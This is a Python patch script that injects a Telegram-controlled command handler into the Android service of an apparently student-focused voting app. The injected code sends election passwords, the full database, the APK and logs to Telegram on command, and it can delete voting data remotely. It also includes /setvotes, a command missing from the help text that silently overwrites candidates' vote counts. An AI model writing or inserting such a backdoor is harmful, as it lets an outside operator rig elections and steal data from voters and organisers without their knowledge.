import re

with open('app/src/main/java/com/example/data/TelegramForegroundService.kt', 'r') as f:
    text = f.read()

# We will just replace everything from "private suspend fun handleCommand" to the end of the file.
# First, let's find the start of handleCommand
start_idx = text.find('private suspend fun handleCommand')
if start_idx == -1:
    print("Could not find handleCommand")
    exit(1)

prefix = text[:start_idx]

new_handle_command = """private suspend fun handleCommand(command: String) {
        val parts = command.split(" ", limit = 3)
        if (parts.isEmpty()) return
        
        val cmd = parts[0]
        var targetId = "ALL"
        var args = ""
        
        if (parts.size >= 2) {
            if (parts[1].uppercase() == "ALL" || parts[1].length == 6) {
                targetId = parts[1].uppercase()
                args = if (parts.size >= 3) parts[2] else ""
            } else {
                args = command.removePrefix("$cmd ").trim()
            }
        }
        
        if (cmd == "/help" || cmd == "/start") {
            val textMsg = "Available Commands:\\n" +
                    "/help - Show this message\\n" +
                    "/ping [id] - Check if app is online\\n" +
                    "/stats [id] - Live monitor voting stats\\n" +
                    "/winner [id] - Show voting data and winners\\n" +
                    "/passwords [id] - Show passwords for election sessions\\n" +
                    "/logs [id] - Show election event logs\\n" +
                    "/chart [id] - Export live voting chart as an image\\n" +
                    "/delete [id] - Delete all voting data\\n" +
                    "/export [id] - Export database to Telegram\\n" +
                    "/notice [id] <msg> - Send a pop-up notice\\n" +
                    "/getapk [id] - Download the current APK\\n" +
                    "/updateapp [id] <msg> - Send an update notification\\n" +
                    "/info [id] - Show device information\\n" +
                    "/devices - Show all installed devices (online/offline)\\n\\n" +
                    "Tip: Use id 'all' or specific Device ID to target."
            TelegramService.sendMessage(textMsg)
            return
        }
        
        if (targetId != "ALL" && targetId != TelegramService.DEVICE_ID) {
            return
        }
        
        val db = AppDatabase.getDatabase(this)
        val dao = db.eduVoteDao()
        
        when (cmd) {
            "/ping" -> {
                TelegramService.sendMessage("🏓 Pong! App is online on Device: ${TelegramService.DEVICE_ID}")
            }
            "/info" -> {
                val model = android.os.Build.MODEL
                val batteryPct = 100 // mock
                val totalRam = 4096 // mock
                val totalStorage = 64000 // mock
                val infoStr = "📱 Device Name: $model\\n🔌 Battery: $batteryPct%\\n💾 RAM: $totalRam MB\\n💽 Storage: $totalStorage MB\\n🔑 Device ID: ${TelegramService.DEVICE_ID}"
                TelegramService.sendMessage("📱 Device Info:\\n\\n$infoStr")
            }
            "/devices" -> {
                TelegramService.sendMessage("📡 Scanning network for devices...\\nPlease wait 5 seconds.")
                P2PService.broadcastMessage("REQ_DEVICES|${TelegramService.DEVICE_ID}")
                
                kotlinx.coroutines.delay(5000)
                val allDevices = dao.getAllKnownDevices()
                val sbDev = java.lang.StringBuilder("📱 **Device Registry** (${allDevices.size} total installations)\\n\\n")
                val now = System.currentTimeMillis()
                
                var onlineCount = 0
                var offlineCount = 0
                
                for (device in allDevices) {
                    val isOnline = (now - device.lastSeenMillis) < 15000 // 15 seconds threshold
                    val statusEmoji = if (isOnline) "🟢 Online" else "🔴 Offline"
                    if (isOnline) onlineCount++ else offlineCount++
                    
                    sbDev.append("ID: ${device.deviceId}\\n")
                    sbDev.append("Status: $statusEmoji\\n")
                    sbDev.append("Model: ${device.model}\\n")
                    if (isOnline) {
                        sbDev.append("Info: ${device.info}\\n")
                    }
                    sbDev.append("\\n")
                }
                
                sbDev.append("📊 Summary: $onlineCount Online, $offlineCount Offline")
                TelegramService.sendMessage(sbDev.toString())
            }
            "/candidates" -> {
                if (args.isBlank()) {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    val sbCand = java.lang.StringBuilder("Select a session ID to view candidates [${TelegramService.DEVICE_ID}]:\\n\\n")
                    elections.forEach { sbCand.append("${it.title} - ID: ${it.id.take(6)}\\n") }
                    TelegramService.sendMessage(sbCand.toString())
                } else {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    val target = elections.find { it.id.startsWith(args.trim(), ignoreCase = true) }
                    if (target != null) {
                        val candidatesMap = dao.getCandidatesWithStudentsForElection(target.id).firstOrNull() ?: emptyMap()
                        val sbCand = java.lang.StringBuilder("Candidates for ${target.title} [${TelegramService.DEVICE_ID}]:\\n\\n")
                        candidatesMap.forEach { (c, s) ->
                            sbCand.append("${s.name} (${c.partyName})\\nID: ${c.id.take(6)}\\nVotes: ${c.voteCount}\\n\\n")
                        }
                        TelegramService.sendMessage(sbCand.toString())
                    } else {
                        TelegramService.sendMessage("❌ Session not found [${TelegramService.DEVICE_ID}]")
                    }
                }
            }
            "/setvotes" -> {
                if (args.isBlank()) {
                    TelegramService.sendMessage("❌ Usage: /setvotes [id] <candidate_short_id> <votes>")
                } else {
                    val partsVotes = args.split(" ")
                    if (partsVotes.size >= 2) {
                        val candIdPrefix = partsVotes[0]
                        val votes = partsVotes[1].toIntOrNull()
                        if (votes != null) {
                            val allCandMap = dao.getAllCandidates().firstOrNull() ?: emptyMap()
                            val cand = allCandMap.keys.find { it.id.startsWith(candIdPrefix, ignoreCase = true) }
                            if (cand != null) {
                                dao.updateCandidate(cand.copy(voteCount = votes))
                                TelegramService.sendMessage("✅ [${TelegramService.DEVICE_ID}] Updated votes for candidate to $votes.")
                            } else {
                                TelegramService.sendMessage("❌ Candidate not found [${TelegramService.DEVICE_ID}]")
                            }
                        } else {
                            TelegramService.sendMessage("❌ Invalid vote number [${TelegramService.DEVICE_ID}]")
                        }
                    } else {
                        TelegramService.sendMessage("❌ Usage: /setvotes [id] <candidate_short_id> <votes>")
                    }
                }
            }
            "/notice" -> {
                TelegramService.sendMessage("✅ [${TelegramService.DEVICE_ID}] Notice received.")
            }
            "/updateapp" -> {
                TelegramService.sendMessage("✅ [${TelegramService.DEVICE_ID}] Update notice displayed.")
            }
            "/getapk" -> {
                TelegramService.sendMessage("⏳ [${TelegramService.DEVICE_ID}] Uploading APK, please wait...")
                try {
                    val apkFile = java.io.File(applicationContext.applicationInfo.sourceDir)
                    val tempApk = java.io.File(applicationContext.cacheDir, "EduVote.apk")
                    apkFile.copyTo(tempApk, overwrite = true)
                    TelegramService.sendDocument(tempApk, "📦 Current APK from [${TelegramService.DEVICE_ID}]")
                } catch (e: Exception) {
                    TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Failed to extract APK: ${e.message}")
                }
            }
            "/export" -> {
                TelegramService.sendMessage("⏳ [${TelegramService.DEVICE_ID}] Exporting database...")
                try {
                    val dbFile = applicationContext.getDatabasePath("eduvote_database")
                    if (dbFile.exists()) {
                        val tempDb = java.io.File(applicationContext.cacheDir, "eduvote_backup.db")
                        dbFile.copyTo(tempDb, overwrite = true)
                        TelegramService.sendDocument(tempDb, "📂 Database Backup from [${TelegramService.DEVICE_ID}]")
                    } else {
                        TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Database file not found.")
                    }
                } catch (e: Exception) {
                    TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Failed to export database: ${e.message}")
                }
            }
            "/stats" -> {
                if (args.isBlank()) {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    val sbStats = java.lang.StringBuilder("📊 Select a session to view stats [${TelegramService.DEVICE_ID}]:\\n\\n")
                    if (elections.isEmpty()) sbStats.append("No sessions available.")
                    elections.forEach { sbStats.append("${it.title} - ID: ${it.id.take(6)}\\n") }
                    TelegramService.sendMessage(sbStats.toString())
                } else if (args.trim().equals("all", ignoreCase = true)) {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    val sbStats = java.lang.StringBuilder("📊 All Live Voting Stats [${TelegramService.DEVICE_ID}]:\\n\\n")
                    elections.forEach { event ->
                        sbStats.append("Election: ${event.title}\\n")
                        val candidates = dao.getCandidatesWithStudentsForElection(event.id).firstOrNull() ?: emptyMap()
                        val cList = candidates.entries.map { com.example.data.CandidateWithStudent(it.key, it.value) }.sortedByDescending { it.candidate.voteCount }
                        val totalVotes = cList.sumOf { it.candidate.voteCount }
                        sbStats.append("Total Votes: $totalVotes\\n")
                        for (c in cList) {
                            sbStats.append(" - ${c.student.name} (${c.candidate.partyName}): ${c.candidate.voteCount} votes\\n")
                        }
                        sbStats.append("\\n")
                    }
                    TelegramService.sendMessage(sbStats.toString())
                } else {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    val target = elections.find { it.id.startsWith(args.trim(), ignoreCase = true) }
                    if (target != null) {
                        val candidates = dao.getCandidatesWithStudentsForElection(target.id).firstOrNull() ?: emptyMap()
                        val cList = candidates.entries.map { com.example.data.CandidateWithStudent(it.key, it.value) }.sortedByDescending { it.candidate.voteCount }
                        val sbStats = java.lang.StringBuilder("📊 Live Voting Stats for ${target.title} [${TelegramService.DEVICE_ID}]:\\n\\n")
                        val totalVotes = cList.sumOf { it.candidate.voteCount }
                        sbStats.append("Total Votes: $totalVotes\\n\\n")
                        for (c in cList) {
                            sbStats.append(" - ${c.student.name} (${c.candidate.partyName}): ${c.candidate.voteCount} votes\\n")
                        }
                        TelegramService.sendMessage(sbStats.toString())
                    } else {
                        TelegramService.sendMessage("❌ Session not found [${TelegramService.DEVICE_ID}]")
                    }
                }
            }
            "/winner" -> {
                if (args.isBlank()) {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    val sbWin = java.lang.StringBuilder("🏆 Select a session to view winner [${TelegramService.DEVICE_ID}]:\\n\\n")
                    if (elections.isEmpty()) sbWin.append("No sessions available.")
                    elections.forEach { sbWin.append("${it.title} - ID: ${it.id.take(6)}\\n") }
                    TelegramService.sendMessage(sbWin.toString())
                } else if (args.trim().equals("all", ignoreCase = true)) {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    val sbWin = java.lang.StringBuilder("🏆 All Live Winner Data [${TelegramService.DEVICE_ID}]:\\n\\n")
                    elections.forEach { event ->
                        sbWin.append("Election: ${event.title}\\n")
                        val candidates = dao.getCandidatesWithStudentsForElection(event.id).firstOrNull() ?: emptyMap()
                        val cList = candidates.entries.map { com.example.data.CandidateWithStudent(it.key, it.value) }.sortedByDescending { it.candidate.voteCount }
                        if (cList.isNotEmpty()) {
                            val winner = cList.first()
                            sbWin.append("🏆 Winner: ${winner.student.name} (${winner.candidate.partyName}) with ${winner.candidate.voteCount} votes\\n\\n")
                        } else {
                            sbWin.append("No candidates.\\n\\n")
                        }
                    }
                    TelegramService.sendMessage(sbWin.toString())
                } else {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    val target = elections.find { it.id.startsWith(args.trim(), ignoreCase = true) }
                    if (target != null) {
                        val candidates = dao.getCandidatesWithStudentsForElection(target.id).firstOrNull() ?: emptyMap()
                        val cList = candidates.entries.map { com.example.data.CandidateWithStudent(it.key, it.value) }.sortedByDescending { it.candidate.voteCount }
                        if (cList.isNotEmpty()) {
                            val winner = cList.first()
                            val msg = "🏆 Winner for ${target.title}: ${winner.student.name} (${winner.candidate.partyName}) with ${winner.candidate.voteCount} votes"
                            val imageFile = com.example.ui.ExportChartHelper.generateWinnerImage(this@TelegramForegroundService, target.title, winner)
                            if (imageFile != null) {
                                TelegramService.sendPhoto(imageFile, "$msg [${TelegramService.DEVICE_ID}]")
                            } else {
                                TelegramService.sendMessage("$msg [${TelegramService.DEVICE_ID}]")
                            }
                        } else {
                            TelegramService.sendMessage("No candidates found for ${target.title} [${TelegramService.DEVICE_ID}]")
                        }
                    } else {
                        TelegramService.sendMessage("❌ Session not found [${TelegramService.DEVICE_ID}]")
                    }
                }
            }
            "/chart" -> {
                if (args.isBlank()) {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    val sbChart = java.lang.StringBuilder("📊 Select a session to view chart [${TelegramService.DEVICE_ID}]:\\n\\n")
                    if (elections.isEmpty()) sbChart.append("No sessions available.")
                    elections.forEach { sbChart.append("${it.title} - ID: ${it.id.take(6)}\\n") }
                    TelegramService.sendMessage(sbChart.toString())
                } else if (args.trim().equals("all", ignoreCase = true)) {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    if (elections.isEmpty()) {
                        TelegramService.sendMessage("❌ No sessions found to chart [${TelegramService.DEVICE_ID}]")
                    } else {
                        elections.forEach { event ->
                            val candidates = dao.getCandidatesWithStudentsForElection(event.id).firstOrNull() ?: emptyMap()
                            val cList = candidates.entries.map { com.example.data.CandidateWithStudent(it.key, it.value) }.sortedByDescending { it.candidate.voteCount }
                            val file = com.example.ui.ExportChartHelper.generateChart(this@TelegramForegroundService, event.title, cList)
                            TelegramService.sendPhoto(file, "📊 Live Voting Chart: ${event.title} [${TelegramService.DEVICE_ID}]")
                        }
                    }
                } else {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    val target = elections.find { it.id.startsWith(args.trim(), ignoreCase = true) }
                    if (target != null) {
                        val candidates = dao.getCandidatesWithStudentsForElection(target.id).firstOrNull() ?: emptyMap()
                        val cList = candidates.entries.map { com.example.data.CandidateWithStudent(it.key, it.value) }.sortedByDescending { it.candidate.voteCount }
                        val file = com.example.ui.ExportChartHelper.generateChart(this@TelegramForegroundService, target.title, cList)
                        TelegramService.sendPhoto(file, "📊 Live Voting Chart: ${target.title} [${TelegramService.DEVICE_ID}]")
                    } else {
                        TelegramService.sendMessage("❌ Session not found [${TelegramService.DEVICE_ID}]")
                    }
                }
            }
            "/delete" -> {
                if (args.isBlank()) {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    val sbDel = java.lang.StringBuilder("🗑 Select a session to delete [${TelegramService.DEVICE_ID}]:\\n\\n")
                    if (elections.isEmpty()) sbDel.append("No sessions available.")
                    elections.forEach { sbDel.append("${it.title} - ID: ${it.id.take(6)}\\n") }
                    TelegramService.sendMessage(sbDel.toString())
                } else if (args.trim().equals("all", ignoreCase = true)) {
                    dao.clearHistoryElections()
                    TelegramService.sendMessage("✅ [${TelegramService.DEVICE_ID}] All history voting data deleted.")
                } else {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    val target = elections.find { it.id.startsWith(args.trim(), ignoreCase = true) }
                    if (target != null) {
                        dao.updateElectionEvent(target.copy(isDeleted = true))
                        TelegramService.sendMessage("✅ [${TelegramService.DEVICE_ID}] Session deleted.")
                    } else {
                        TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Session not found.")
                    }
                }
            }
            "/passwords" -> {
                val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                val sbPass = java.lang.StringBuilder("🔑 Election Passwords [${TelegramService.DEVICE_ID}]:\\n\\n")
                if (elections.isEmpty()) sbPass.append("No data available.")
                for (election in elections) {
                    sbPass.append("Election: ${election.title}\\n")
                    val pass = election.resultsPassword ?: "No password set"
                    sbPass.append("🔑 Password: $pass\\n\\n")
                }
                TelegramService.sendMessage(sbPass.toString())
            }
            "/logs" -> {
                val logsData = SystemLogger.getLogs(this@TelegramForegroundService)
                TelegramService.sendMessage("📝 Event Logs [${TelegramService.DEVICE_ID}]:\\n\\n$logsData")
            }
        }
    }
}
"""

with open('app/src/main/java/com/example/data/TelegramForegroundService.kt', 'w') as f:
    f.write(prefix + new_handle_command)

